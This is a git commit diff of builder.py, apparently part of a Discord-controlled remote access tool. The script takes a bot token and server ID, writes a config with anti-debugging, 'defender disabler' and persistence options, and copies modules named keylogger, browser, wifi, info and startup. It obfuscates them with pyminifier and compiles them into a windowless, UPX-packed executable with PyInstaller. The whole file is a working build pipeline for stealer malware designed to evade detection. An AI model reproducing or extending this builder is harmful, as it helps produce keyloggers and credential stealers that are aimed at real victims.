ddce90a0d280e193bd93dcb6a30ab7034f1c3245
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-23 01:08:22 +0200

    Update builder.py

--- builder.py
+++ builder.py
@@ -1,28 +1,60 @@
 import subprocess
 import os
+import shutil
 from colorama import Fore, Style
 import sys
 import time
+from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
 
 
-def obfuscate(path):
+def create_env(dir):
+    progress.start()
+    task = progress.add_task("Creating env...", total=1)
+    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py"]
+    path = os.path.join(os.getcwd(), dir)
+    
+    if not os.path.exists(path):
+        progress.stop()
+        print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
+        time.sleep(3)
+        sys.exit(1)
+        
+    os.mkdir(os.path.join(os.getcwd(), "build", "modules"))
+    
+    for file in files:
+        try:
+            shutil.copyfile(f"{path}/{file}", f"build/{file}")
+        except:
+            progress.stop()
+            print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
+            time.sleep(3)
+            sys.exit(1)
+    
+    progress.update(task, advance=1)
+
+
+def obfuscate():
+    task1 = progress.add_task("Obfuscating...", total=1)
     try:
-        subprocess.run(f"pyminifier -o {path}/main.py {path}/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
-        subprocess.run(f"pyminifier -o {path}/modules/browser.py {path}/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
-        subprocess.run(f"pyminifier -o {path}/modules/info.py {path}/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
-        subprocess.run(f"pyminifier -o {path}/modules/startup.py {path}/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
-        subprocess.run(f"pyminifier -o {path}/modules/antidebug.py {path}/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
-        subprocess.run(f"pyminifier -o {path}/modules/wifi.py {path}/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
-        subprocess.run(f"pyminifier -o {path}/modules/keylogger.py {path}/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
+        subprocess.run(f"pyminifier -o build/main.py build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
+        subprocess.run(f"pyminifier -o build/modules/browser.py build/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
+        subprocess.run(f"pyminifier -o build/modules/info.py build/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
+        subprocess.run(f"pyminifier -o build/modules/startup.py build/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
+        subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
+        subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
+        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
+        progress.update(task1, advance=1)
     except:
+        progress.stop()
         print("[-] To obfuscate please install pyminifier or disable obfuscation from building options!")
         time.sleep(3)
         sys.exit(1)
+    
 
-
-def build(path, icon, file, upx=True, obf=True):
-    print(Fore.BLUE +"[+] Building exe..."+ Style.RESET_ALL)
-    if obf: obfuscate(path)
+def build(path, icon, upx=True, obf=True):
+    create_env(path)
+    if obf: obfuscate()
+    task2 = progress.add_task("Compiling...", total=1)
     
     if upx:
         UpxArg = "--upx-dir C:/UPX"
@@ -30,16 +62,23 @@ def build(path, icon, file, upx=True, obf=True):
         UpxArg = ""
     
     try:
-        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
+        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+        try:
+            shutil.rmtree(os.path.join(os.getcwd(), "build"))
+            os.remove(os.path.join(os.getcwd(), "main.spec"))
+        except: 
+            pass
+        progress.update(task2, advance=1)
+        progress.stop()
         print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
         time.sleep(3)
     except:
+        progress.stop()
         print(Fore.RED +"[-] Please make sure you have pyinstaller, pyarmor and UPX installed under C:/UPX!"+ Style.RESET_ALL)
         time.sleep(3)
         sys.exit(1)
-
-
+    
+    
 def convert(value, name):
     if value.lower() == "y":
         return True
@@ -51,16 +90,26 @@ def convert(value, name):
         sys.exit(0)
 
 
-def config(path, token, guild_id, interval, error, antidebug, defender, move):    
+def config(token, guild_id, interval, error, antidebug, defender, move):    
     config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
+    build_dir = os.path.join(os.getcwd(), "build")
     
-    if not os.path.exists(path):
-        print(Fore.RED +f"[-] Please make sure you have source code under '{path}' folder relative to builder or edit building options!"+ Style.RESET_ALL)
-        time.sleep(3)
-        sys.exit(1)
+    if os.path.exists(build_dir):
+        shutil.rmtree(build_dir)
+        os.mkdir(build_dir)
+    else:
+        os.makedirs(build_dir)
     
-    with open(f"{path}\config.py", "w") as f:
+    with open(f"build\config.py", "w") as f:
         f.write(config)
+
+
+progress = Progress(
+    TextColumn("[bold blue]{task.description}", justify="right"),
+    BarColumn(bar_width=None),
+    SpinnerColumn(style="bold", spinner_name="simpleDotsScrolling", speed=1),
+    TimeElapsedColumn()
+)
 
 
 token = input("[?] Enter bot token: ")
@@ -79,12 +128,12 @@ if choice.lower() == "y":
     icon = input("[?] Enter icon file: ")
     path = input("[?] Enter source code directory: ")
     
-    config(path, token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
-    build(path, icon, f"{path}\main.py", convert(upx, "UPX"), convert(obf, "obfuscation"))
+    config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
+    build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
     
 elif choice.lower() == "n":
-    config("src", token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
-    build("src", "icon.ico", "src\main.py")
+    config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
+    build("src", "icon.ico")
     
 else:
     print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
